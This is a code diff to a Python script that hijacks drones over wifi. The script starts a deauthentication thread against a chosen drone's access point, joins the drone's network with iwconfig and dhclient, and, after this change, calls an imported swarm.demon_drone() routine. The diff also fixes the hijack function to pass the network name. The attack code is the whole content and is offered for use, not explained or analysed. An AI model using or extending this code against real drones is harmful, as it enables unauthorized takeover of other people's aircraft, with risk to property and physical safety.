@@ -5,6 +5,7 @@ import os
 import threading 
 import wireless 
 import time 
+import swarm
 
 class Deauth(threading.Thread):
     def __init__(self,mac=None):
@@ -30,7 +31,7 @@ def get_interface():
 
 
 def hijack_drone(target,wint):
-   os.system('iwconfig {0} essid {1}'.format(wint,target[1]))
+   os.system('iwconfig {0} essid {1}'.format(wint,target))
    time.sleep(1)
    os.system('dhclient {0}'.format(wint))
    
@@ -114,7 +115,7 @@ targ_id = seek_target()
 Deauth(ap_list[targ_id - 1][0]).start()
 a = raw_input("Deauthing...hit enter when deauth tips you off")
 monitor_manage('stop')
-hijack_drone(ap_list[targ_id - 1][0],wl)
-
+hijack_drone(ap_list[targ_id - 1][1],wl)
+swarm.demon_drone() 
 
 
